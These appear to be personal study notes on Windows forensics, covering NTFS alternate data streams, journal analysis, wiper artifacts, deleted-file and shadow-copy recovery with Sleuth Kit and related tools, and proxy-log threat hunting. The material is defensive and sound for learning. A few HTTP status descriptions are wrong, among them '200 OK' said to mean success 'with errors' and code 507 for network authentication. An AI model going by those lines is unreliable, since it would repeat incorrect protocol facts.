icat [options] image inode > extracted.data

  -r: Recover deleted file
  -s: Display slack space at end of file
```  
- Extract Data from a Metadata Address
  - By default, the icat tool extracts data to STDOUT based on a specific metadata entry
  - Able to extract data from metadata entries marked deleted

<br>

- Extracting NTFS $DATA streams
  - With NTFS, the default will be to extract out the primary $DATA stream
  - To extract a different stream, such as an Alternate Data Stream, use syntaz:

```
<mft#>-<AttributeType>-<AttributeID>
```  

```
icat /cases/cdrive/hostname.E01 132646-128-5
[Zone Transfer]
ZoneId=3
ReferrerURL=https://www.example.com
HostUrl=https://www.badwebsite.com/most/likely/malware/412341234?journalCode=acmm
```

<br>

### The Zone Identifier ADS -  Evidence of Download

- Live System (Enumerate)

```
dir /r
```

- Image (Linux)

```bash
fls -r hostname.E01 | grep :.*:
```  

```bash
istat hostname.E01 39345
```  

```bash
icat hostname.E01 39345-128-9 > ads1
```  

```bash
file ads1
```  

- Image (Windows)

```bash
MFTECmd.exe -f 'E:\C\$MFT' --csv 'G:\' --csvf mft.csv
````

 - Open in TimelineExplorer
 - Filter "Has Ads" or "Is Ads"
 - Filter .exe
 - Note "Zone Id Contents" Column

<br>

### Filenames
- Filenames potentially sotred in two places:
  - File System Metadata
    - MFT Entry
  - Directory Data
    - Contains list of children files/directories

<br>

**Lethal Technique**
- Most file wipping software does not wipe directory entries
- Slack space of directory will contain metadata including file names and timestamps
- Some forensic tools ignore directory slack entries

<br>

### NTFS Directory Attributes
- Stored in an index named $I30
- Index composed of $INDEX_ROOT and optionally $INDEX_ALLOCATION
  - $INDEX_ROOT -- required (Stored in MFT)
    - Always resident
  - $INDEX_ALLOCATION -- required for larger directories (stored in clusters)
    - Always non-resident

<br>

### Parsing I30 Directory Indexes

**Indx2Csv**
  - Parses out active and slack entries
  - Includes additional features for recovering partial entries

```bash
Indx2Csv /IndxFile:G:\cases\$I30 /OutputPath:G:\cases
```  

<br>

**Velociraptor**
- Parses out active and slack entries
- Able to recurse the file system

```bash
Velociraptor artifacts collect Windows.NTFS.I30 --args DirectoryGlobs="F:\\Windows\\Temp\\Perfmon\\" --format=csv
```

<br>

### File System Jounraling Overview
- Records files system metadata changes
- Two files track these changes: $LogFile and $UsnJrnl
- Primary goal is returning file system to a clean state
- Secondary goal is providing hints to applications about file changes
- Forensic examiners can use journals to identify prior state of files, and when their state changed
  - Like VSS, they serve as a time machine, detailing past file system activites
  - Unlike VSSm the journals are rolling logs, rather than a point in time snapshot

<br>

### $LogFile Provides File System Resilience
- $LogFile stores low-level transactional logs for NTFS consistency
- Maintains very detailed information, including fill payload data to be recorded in MFT, Indexes, UsnJrnl, & more
- Tends to last just a dew hours on active systems
  - Secondary drives often last much longer (i.e. days)

<br>

### UsnJrnl
- Stores high-level summary information about changes to files & directories
- Used by applications to determine which files they should act upon
- Tends to last a few days on active systems
	- Secondary drives often last much longer (i.e., weeks)
- Stored in large $J ADS

<br>

### Common Activity Patterns in the Journals
- Due to the somwhat cryptic nature of the journals (particularly the $LogFile), interpretation often requires understanding activity patterns
- Below are several common activities on the file system and a reliable set of codes from the journals to signify their occurence (look for the combination of the codes to avoid false-positives)

<br>

| **Action** | **$LogFile Codes** | **$UsnJrnl Codes** |
| :---------------: | :---------------: | :---------------: |
|File/Directory Creation|AddIndexEntryAllocation <br> InitializeFileRecordSegment|FileCreate|
|File/Directory Deletion|DeleteIndexEntryAllocation <br> DeallocationFileRecordSegment|FileDelete|
|File/Directory Rename or Move|DeleteIndexEntryAllocation <br> AddIndexEntryAllocation|RenameOldName <br> RenameNewName|
|ADS Creation|CreateAttribute with name ending in ":ADS"|StreamChange <br> NamedDataExtend|
|File Data Modification|* Op codes for $LogFile are not sufficient to determine file modification|DataOverwrite - DataExtend - Data Truncation|

<br>

### Useful Filter and Searches in the Journals
- Parent directory filtering is a powerful technique with journal logs

<br>

| **Parent Directories to Filter** | **Investigative Relevance** |
| :---------------: | :---------------: |
|C:\Windows & C\Windows\System32|Directories coveted by attackers|
|C:\Windows\Prefetch|Attackers often delete prefetch files|
|Attacker's Working Directories|Discover unknown attacker tools and exfil|
|Temp Directories|Focus on executables|
|C:\Users&#92;*\Downloads|Find Recently Downloaded Files|
|C:\Users&#92;*\AppData\Roaming\Microsoft\Windows\Recent|Find additional times and files opened by users|
|C:&#92;$Recycle.Bin&#92;SID|Check for deleted files prior to Recycle Bin empty|

<br>

**File Types or Names of Interest Created or Recently Deleted**
- Executables (.exe, .dll, .sys, .pyd)
- Archives (.rar, .zip, .cab, .7z)
- Scripts (.ps1, .vbs, bat)
- IOC file/directory names

<br>

### LogFileParser for $LogFile Analysis

```
LogFileParser.exe /LogFileFile:E: \C\$LogFile /OutputPath:G: \ntfs-anti-forensics
```  
- Primary output file is "LogFile.csv" (shown below). Many supporting files created with additional details
  - if_LSN: Log Sequence Number (LSN) orders entries
  - if_RedoOperation: "Redo" operation is what it's about to do
  - if_UndoOperation: "Undo" is how to back it out
  - if_FileName: File or Directory name being updated
  - if_CurrentAttribute: Identifies which attributes are being changed
  - if_TextInformation: When applicable, provides pointers to payload data in supporting files

<br>

- [LogFileParser](https://github.com/jschicht/LogFileParser)
- [$MFT and $LogFile Analysis](https://tzworks.com/prototype_page.php?proto_id=46)
- [$MFT and $Logfile Analysis User Guide (mala)](https://tzworks.com/prototypes/mala/mala.users.guide.pdf)

<br>

### MFTECmd for $UsnJrnl Analysis

```
mftecmd.exe -f E:\C\$Extend\$J --csv G:\nfts --csvf mftecmd-usnjrnl.csv
```  
- Add -vss to have all volume shadow USN journals parsed automatically
  - Name: File/Directory Name
  - Entry Number: MFT #
  - Parent Entry Number: Parent MFT #
  - Update Timestamp: Update Timestamp
  - Update Reasons: Update Reason Code(s)
  - Update Sequence Number: Update Seq. Number
  - File Attributes: Attribute Flags

<br>

- [Windows Journal Parser (jp) Users Guide](https://tzworks.com/prototypes/jp/jp.users.guide.pdf)

<br>

### NTFS: What Happens When a File is Deleted?
- Data Layer
  - Clusters will be marked as unallocated in $Bitmap, but data will be left intact until clusters are reused
  - File data as well as slack space will still exist
- Metadata Layer
  - A single bit in the file's $MFT record is flipped, so all file metadata will remain until record is reused
  - $LogFile, $UsnJrnl, and other system logs still reference file
- Filename Layer
  - $File_Name attribute is preserved until MFT record is reused
  - $I30 index entry in parent directory may be preserved

<br>

## Advanced Evidence Recovery

- Popular Wipers
  - BleachBit
  - ERASER
  - SDelete
  - BCWipe

<br>

### SDelete
- Indicators (USNJrnl)
  - Name contains AAAAAAAA, BBBBBBBB, CCCCCCCC
  - Update Reasons: DataOverwrite, RenameOldNmae
  - Windows Search Index (gather) logs has indicators
  - $I30 Slack has indicators
  - Prefetch has indicators (files touch within 10 seconds of execution)

<br>

### BCWiper
- Renames files once with random name equal in size to original
- $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist

<br>


### Eraser
- Includes an option to use a "legitamate" file name prior to final deletion
- Renamed MFT records (with ADS, if present), $I30 slack, $UsnJrnl, $LogFile, and Evidence of Execution artifacts persist

<br>

### Cipher
- Creates a persist directory name EFSTMPWP at the volume root and adds temp files within it to fill free space

<br>

### Registry Key/Value "Records" Recovery
- Registry hives have unallocated space similar to filesystems
- A deleted hive key is marked as unallocated; possible to recover
  - Keys
  - Values
  - Timestamps
- Eric Zimmerman's Registry Explorer makes recovering deleted registry data trivial

<br>

### Finding Fileless Malware in the Registry
- Attackers try ot hide amongst the noise in the registry
- Registry Explorer has convenient features to spot anomalies
- Detect Large Values
- Detect Base64 values

<br>

### File Recovery

**Metadata Method**
- When a file is deleted, its metadata is marked as unused, but metadata remains
- Read metadata entries that are marked as deleted and extract the data from any clusters it points to

<br>

**Carving Method**
- If the metadata entry has been resused, the data may still reside on disk, but we have to search for it
- Use known file signatures to find the start, then extract the data to a known file footer or to reasonable size limit

<br>

**Files to Target**
- Link Files
- Jumplists
- Recycle Bin
- Web History
- Prefetch
- Binaries
- Archives
- Office Docs
- CAD Drawings
- Email Stores
- Images
- Videos

<br>

### File Recovery via Metadata Method
- Extract deleted files individually with icat

```icat -r <image> inode```  

- Extract all deleted files with ```tsk_recover```  

```tsk_recover <image> <output-directory>```  

- Multiple forensic tools can locate MFT entries marked deleted and allow us to export (FTK Imager)

<br>

### File Recovery via Carving Method
- PhotoRec is an excellent free file carver
- Runs on Windows, Linux, and Mac
- Provides signatures for 300+ file types
- Leverages metadata from carved files
- [PhotoRec](https://www.cgsecurity.org/wiki/PhotoRec)

<br>

### Recovering Deleted Volume Shadow Copy Snapshots
- The ultimate files to recover -- VSS files
- Shadow copy files from the System Volume Information folder can be recovered
- vss_carver.py carves and recreates volumeshadow snapshots from disk images
- [Deleted Shadow Copies](http://www.kazamiya.net/en/DeletedSC)
- [Black Hat Presentation](https://i.blackhat.com/us-18/Thu-August-9/us-18-Kobayashi-Reconstruct-The-World-From-Vanished-Shadow-Recovering-Deleted-VSS-Snapshots.pdf)

<br>

- Step 1: Use vss_carver against the raw image

```vss_carver -t RAW -i /mnt/ewf_mount/ewf1 -o 0 -c ~/vsscarve-basefile/catalog -s ~/vsscarve-basefile/store```  

- Step 2: Review (and possibly reorder) recovered VSCs

```vss_catalog_manipulator list ~/vsscarve-basefile/catalog```  

- Step 3: Present recovered VSCs as raw disk images

```vshadowmount -o 0 -c ~/vsscarve-basefile/catalog -s ~/vsscarve-basefile/store /mnt/ewf_file/ewf1 /mnt/vsscarve_basefile/```  

- Step 4: Mount all logical filesystems of snapshot

```cd /mnt/vsscarve_basefile/```  
```for i in vss*; do mountwin $i /mnt/shadowcarve_basefile/$i; done```  

<br>

### Stream Carving for Event Log and File System Records
- Potential to recover several important record types
- NTFS:
  - MFT
  - $UsnJrnl
  - $I30
  - $ LogFile
- Event log EVTX records
- Bulk extractor is fast
  - bulk_extractor-rec
- [Bulk Extractor](https://github.com/simsong/bulk_extractor/wiki)
- [Bulk Extractor with Record Carving](https://www.kazamiya.net/en/bulk_extractor-rec)

<br>

### Carving for Strings
- [bstrings](https://github.com/EricZimmerman/bstrings)

```bstrings -f image.dd.001 --lr bitlocker``` (Find BitLocker Key)

- [Autopsy Keyword Search and Indexing](https://www.sleuthkit.org/autopsy/keyword.php)

<br>

## Defensive Coutermeasures

### Leverage File System History
- Ensure Volume Snapshots are enabled
  - Disable "ScopeSnapshots"
  - Increase reserved size for snapshots
  - Consider VSC scheduled tasks to increase frequency
- Increase NTFS journal sizes:
  - $LogFile: default size is 64MB
  - $UsnJrnl: typical size is 32MB; some servers are 512MB
    - $UsnJrnl is preferred due to more efficient logging
- Monitor for suspicious file system activity
  - fsutil, vssadmin, wmic, shadowcopym win32_shadowcopy

<br>

### Level Up on Visibility
- Log
  - Forward
- Deploy enhanced logging configurations
  - PowerShell and Windows audit policy improvements
  - EDR technology such as sysmon

<br>

# Network Forensics

## Web Proxy Data

### Common Log Fields
- UNIX Timestamp
- Response Time
- Requestor IP (Layer 3 or X Forwarded For)
- Cache Status & HTTP Status Code (Cache or Retrieved)
- Reply Size (Bytes)
- Request Method (GET, POST, etc.)
- URL Requested
- Username (If proxy authentication used)
- MIME Type (Given by the Originating Server)

<br>

### Convert Timestamps
```date -d @1573137112.368```

<br>

To UTC  
```date -u -d @1573137112.368```

<br>

Convert a lot of timestamps at once
```
sudo cat /var/log/squid/access.log |
awk '{$1=strftime("%F %T", $1, 1);
print $0}'
```

<br>

### Threat Hunt Process
- Plan
- Collect Evidence
- Form Hypothesis (Likely a broad one)
- Analyze Evidence
- Support/refute/refine hypothesis
  - Repeat until stable

<br>

### Uniq Domain Counts
```
grep-v "\"CONNECT " access.log |
awk '{ print $7 }' |
awk -f/ '{ print $3 }' |
sort | uniq -c | sort -nr
```

<br>

### Google Auto Complete
```
grep google.com access.log | wc -l

grep google.com access.log | grep complete | wc -l

grep google.com access.log | grep complete | less
```

<br>

## HTTPS

### Request Componenets

- OPTIONS: Allows the client to query the server for requirements or capabilities
- HEAD: Identical to GET, but tells server to only return resulting headers for the request
- PUT: Requests that the serer create a resource at the specified location, containing the data supplied in the request
- DELETE: Requests that the server remove a resource at the specified location
- TRACE: Used in troubleshooting a request across multiple proxy srevers -- this is not common and is generally disabled on servers
- CONNECT: Requests that a proxy switch to a tunnel, such as with SSL/TLS encryption

<br>

Notes:
- Other specialized protocols such as WebDAV user their own methods as well
- X-Forwarded-For: a header that indicates the original source of the rquest in the event that multiple proxy servers handled the request

<br>

### Response Codes
- **100, Continue**: After the serer recieves the headers for a request, this directs the client to proceed
- **200, OK**: Possibly the most common value, indicates the server was able to fufill the request with errors
- **301, Moved Permanently**: The server provides a new URL for the request resource and the client then ostensibly makes that request. "Permanent" means the original request should assumed outdated.
- **302, Found**: In practice, a temporary relocation, althouhg this is not strictly in compliance with the standard
- **304, Not Modified**: Indicates the request resource has not changed since it was last requested
- **400, Bad Syntax**: The request was somehow syntactically incorrect
- **401, Unauthorized**: Client mus authenticate before the response can be given
- **403, Forbidden**: Request was valid, but client is not permitted access (regardless of authentication)
- **404, Not Found**: Requested resource does not exist
- **407, Proxy Authentication Required**: Like 401, but for the proxy server
- **500, Internal Server Error**: Generic Server Error Message.
- **503, Service Unavailable**:, Server is overloaded or undergoing maintenance.
- **507, Network Authentication Required**: Client must authenticate to gain access-used by captive proxies such as at Wi-Fi hotspots.

<br>

Notes
- A long bout of 400-series return codes from a single IP address may suggest recon
- A sequence of 500-series return codes against a search form followed by a 200 response and a lot of HTTP POST requests could be SQL injection attempt and success, followed by post-compromise operations

<br>

### Response Components
- Server contiues using current TCP session
  - ```Connection: Keep-Alive```
- Server stops using  currect TCP session
  - ```Connection: Close```



















<script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
<script>addBackToTop({
  diameter: 56,
  backgroundColor: 'rgb(255, 82, 82)',
  textColor: '#fff'
})</script>